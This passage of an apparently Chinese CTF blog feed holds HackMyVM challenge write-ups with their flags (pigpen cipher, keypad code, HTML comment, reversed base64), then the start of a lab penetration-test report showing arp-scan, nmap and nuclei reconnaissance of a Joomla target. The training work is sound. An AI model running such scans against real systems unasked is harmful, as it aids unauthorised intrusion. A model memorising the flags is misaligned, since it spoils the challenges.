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
kv4fmdy7yXs3RecAAAAASUVORK5CYII=


┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat ourobouros|base64 -d &gt; our
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll our
-rwxr-xr-x 1 kali kali 7775 Jun 21 01:02 our
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ file our                               
our: PNG image data, 811 x 137, 8-bit/color RGBA, non-interlaced
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ mv our our.png
                                  
```

![our](https://7r1umphk.github.io/image/20250621130302644.webp)

google一下

![image-20250621130351324](https://7r1umphk.github.io/image/20250621130351621.webp)

https://www.dcode.fr/pigpen-cipher

![image-20250621130909609](https://7r1umphk.github.io/image/20250621130910070.webp)

第一个

```
HMV{NOTILLUMINATI}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20049.html</guid><pubDate>Fri, 27 Jun 2025 09:29:51 +0000</pubDate></item><item><title>Challenge 011</title><link>https://7r1UMPHK.github.io/post/Challenge%20011.html</link><description># 1. 初步分析

**挑战链接:** https://hackmyvm.eu/challenges/challenge.php?c=011

![挑战图片](https://7r1umphk.github.io/image/20250518110146012.webp)

## 1. 初步分析

挑战页面显示了一段被 `&lt;pre&gt;` 标签包裹的文本，这通常意味着其中的空格和换行符会被保留，以维持其原始格式。文本内容如下：

```html
&lt;pre&gt; $$$$$$$$$$ $_________$$ $_$$$$$$$_$$ $_$_____$_$$ $_$_____$_$$ $_$_____$_$$ $_$_____$_$$ $_$$$$$$$_$$ $_________$$ $$$$$$$$$$ $_________$$ $_1__2__3_$$$ $_4__5__6_$$$ $_7__8__9_$$$ $_*__0__#_$$$ $_________$$$ $$$$$$$$$$$ $$$$$$$$$ FLAG: HMV{?} ? = 3-1 2-1 8-1 2-1 7-4 3-2 2-3 &lt;/pre&gt;
```

观察这段文本，我们可以发现几个关键点：
1.  前半部分用 `$` 和 `_` 字符绘制了一个类似键盘的图形。
2.  紧接着，这个图形下方有了一个更明确的数字键盘布局：
    ```
    $_1__2__3_$$$
    $_4__5__6_$$$
    $_7__8__9_$$$
    $_*__0__#_$$$
    ```
    这非常像一个标准的电话拨号键盘。
3.  最关键的信息是 `FLAG: HMV{?} ? = 3-1 2-1 8-1 2-1 7-4 3-2 2-3`。
    这表明我们需要根据给出的坐标 `X-Y` 来从电话键盘上找出对应的字符，以替换 `?`。

## 2. 解密过程

这个挑战的核心是理解坐标 `X-Y` 如何映射到电话键盘上的字符。

### 2.1 理解键盘布局与编码

标准的电话键盘按键通常与字母相关联（用于 T9 输入等）：
*   `1`: (通常没有字母，或有特殊符号)
*   `2`: `ABC`
*   `3`: `DEF`
*   `4`: `GHI`
*   `5`: `JKL`
*   `6`: `MNO`
*   `7`: `PQRS`
*   `8`: `TUV`
*   `9`: `WXYZ`
*   `0`: (通常是空格或 `+`)
*   `*`, `#`: 特殊功能键

给出的坐标格式是 `X-Y`。我们可以合理地推断：
*   `X` 代表电话键盘上的数字键。
*   `Y` 代表该数字键上对应字母序列中的第 `Y` 个字母（1-based index）。

### 2.2 坐标解析

现在我们来逐个解析给出的坐标 `3-1 2-1 8-1 2-1 7-4 3-2 2-3`：

1.  **`3-1`**:
    *   键 `3` 对应字母 `DEF`。
    *   第 `1` 个字母是 `D`。

2.  **`2-1`**:
    *   键 `2` 对应字母 `ABC`。
    *   第 `1` 个字母是 `A`。

3.  **`8-1`**:
    *   键 `8` 对应字母 `TUV`。
    *   第 `1` 个字母是 `T`。

4.  **`2-1`**:
    *   键 `2` 对应字母 `ABC`。
    *   第 `1` 个字母是 `A`。

5.  **`7-4`**:
    *   键 `7` 对应字母 `PQRS`。
    *   第 `4` 个字母是 `S`。

6.  **`3-2`**:
    *   键 `3` 对应字母 `DEF`。
    *   第 `2` 个字母是 `E`。

7.  **`2-3`**:
    *   键 `2` 对应字母 `ABC`。
    *   第 `3` 个字母是 `C`。

### 2.3 组合解密字符

将解析出来的字母组合起来，得到：`D A T A S E C`。

## 3. 获取 Flag

将上面解密得到的字符串 `DATASEC` 替换掉 `FLAG: HMV{?}` 中的 `?`。

## 4. Flag

最终的 Flag 是：
```
HMV{DATASEC}
```
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20011.html</guid><pubDate>Fri, 27 Jun 2025 09:29:48 +0000</pubDate></item><item><title>Challenge 009</title><link>https://7r1UMPHK.github.io/post/Challenge%20009.html</link><description># 1. 初步分析

**挑战链接:** https://hackmyvm.eu/challenges/challenge.php?c=009

![挑战图片](https://7r1umphk.github.io/image/20250518105248414.webp)

## 1. 初步分析

访问该链接后，页面显一行文字：

```html
The flag is here. &lt;!-- HMV{infrontofme} --&gt;
```
## 2. Flag

最终的 Flag 是：
```
HMV{infrontofme}
```
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20009.html</guid><pubDate>Fri, 27 Jun 2025 09:29:46 +0000</pubDate></item><item><title>Challenge 007：反转字符与Base64解码分析</title><link>https://7r1UMPHK.github.io/post/Challenge%20007%EF%BC%9A-fan-zhuan-zi-fu-yu-Base64-jie-ma-fen-xi.html</link><description># 初始观察

*   **挑战链接:** [https://hackmyvm.eu/challenges/challenge.php?c=007](https://hackmyvm.eu/challenges/challenge.php?c=007)

## 初始观察

访问挑战页面后，展示了以下经过特殊处理的字符串：

![image-20250518101535788](https://7r1umphk.github.io/image/20250518101535983.webp)

原始字符串为：
```
=0Xd0ʞƐMOqWMςЯzɘWƖƎƧ
```
该字符串包含反转字符和 Unicode 特殊字符，初步判断需要进行文本反转和字符替换操作。部分字符可能因本地系统字体库不完整而显示异常。

## 探索过程

针对该字符串的特性，我们采取了以下步骤进行分析和解码。

### 1. 字符串反转处理

首先，对原始字符串进行整体反转。可使用在线文本反转工具，例如 `textfixer.com` 提供的工具：

![image-20250518102657623](https://7r1umphk.github.io/image/20250518102657806.webp)

[https://www.textfixer.com/tools/reverse-text-generator.php](https://www.textfixer.com/tools/reverse-text-generator.php)

输入原始字符串后，工具输出的反转结果（或手动反转并部分规范化后）如下：

![image-20250518102747809](https://7r1umphk.github.io/image/20250518102747978.webp)

```
SEƖWezRςMWqOMƐk0dX0=
```
可以看到，部分易于识别的反转字符（如 `Я` -&gt; `R`, `ʞ` -&gt; `k`）已被工具或初步手动处理还原，但仍存在一些特殊 Unicode 字符（如 `Ɩ`, `ς`, `Ɛ`）需要进一步处理。

### 2. 特殊字符识别与替换

接下来，需要对剩余的特殊字符进行识别，并替换为标准的 ASCII 字符。这一步通常基于字符形状的相似性和在编码中（如 Base64）的常见对应关系进行推断。

原始反转字符串： `SEƖWezRςMWqOMƐk0dX0=`

根据字符形态进行如下替换：
*   `ς` (Greek Small Letter Sigma Symbol) 类似于数字 `2`。替换后：
    `SEƖWezR2MWqOMƐk0dX0=`
*   `Ɛ` (Latin Capital Letter Open E) 类似于数字 `3`。替换后：
    `SEƖWezR2MWqOM3k0dX0=`
*   考虑到 Base64 编码的字符集，以及上下文，`q` 可能对应 `p`，`d` 可能对应 `b`。替换后：
    `SEƖWezR2MWpOM3k0bX0=`
*   `Ɩ` (Latin Letter Iota) 类似于数字 `1`。替换后：
    `SE1WezR2MWpOM3k0bX0=`

经过上述字符替换，得到一个结构更清晰的字符串：
```
SE1WezR2MWpOM3k0bX0=
```
该字符串以 `=` 结尾，且其字符集（大写字母、小写字母、数字）符合 Base64 编码的特征。

### 3. Base64 解码

确认字符串为 Base64 编码后，使用 Base64 解码工具或命令进行解码。
可以使用 `base64` 命令行工具：

执行命令：
```bash
echo 'SE1WezR2MWpOM3k0bX0=' | base64 -d
```
解码输出结果为：
```
HMV{4v1jN3y4m}
```
此即为挑战的 Flag。

## Flag

最终获取的 Flag 为：

`HMV{4v1jN3y4m}`sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20007%EF%BC%9A-fan-zhuan-zi-fu-yu-Base64-jie-ma-fen-xi.html</guid><pubDate>Fri, 27 Jun 2025 09:29:43 +0000</pubDate></item><item><title>靶机 X1 渗透测试报告</title><link>https://7r1UMPHK.github.io/post/ba-ji-%20X1%20-shen-tou-ce-shi-bao-gao.html</link><description>Hello！今天分享一下靶机 X1 的渗透过程。这靶机其实发布有几天了，但我一直没啥空。今天瞅了一眼群里，就一个人解出来了，给我整好奇了！

![image-20250511212617292](https://7r1umphk.github.io//image/20250511212617409.webp)

### 一、信息收集，打探敌情

#### 1. 老规矩，`arp-scan` 开路找邻居

```shell
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l         
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       (Unknown)
192.168.205.2   00:50:56:f4:ef:6f       (Unknown)
192.168.205.207 08:00:27:aa:93:a3       (Unknown)  &lt;-- 目标IP
192.168.205.254 00:50:56:ef:52:74       (Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.957 seconds (130.81 hosts/sec). 4 responded
```

目标IP锁定：`192.168.205.207`。

#### 2. `nmap` 扫端口，看看开了啥服务

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.205.207         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-11 09:26 EDT
Nmap scan report for 192.168.205.207
Host is up (0.00014s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:AA:93:A3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.16 seconds
```

开放了 22 (SSH) 和 80 (HTTP) 端口。那必须先从 80 端口下手！

#### 3. 访问80端口，初探Web应用

浏览器打开 `http://192.168.205.207/`：

![image-20250511212745043](https://7r1umphk.github.io/image/20250511212745266.webp)

看着像是个CMS，页面上还有个 'shark'（鲨鱼）。直觉告诉我，`nuclei` 该启动了！

```shell
┌──(kali㉿kali)-[~]
└─$ nuclei -u http://192.168.205.207/

# ... (部分输出省略) ...

[joomla-manifest-file] [http] [medium] http://192.168.205.207/administrator/manifests/files/joomla.xml
[apache-detect] [http] [info] http://192.168.205.207/ ['Apache/2.4.62 (Debian)']
[corebos-htaccess] [http] [info] http://192.168.205.207/htaccess.txt
[joomla-detect:version] [http] [info] http://192.168.205.207/administrator/manifests/files/joomla.xml ['5.3.0']

# ... (其他检测结果) ...
```

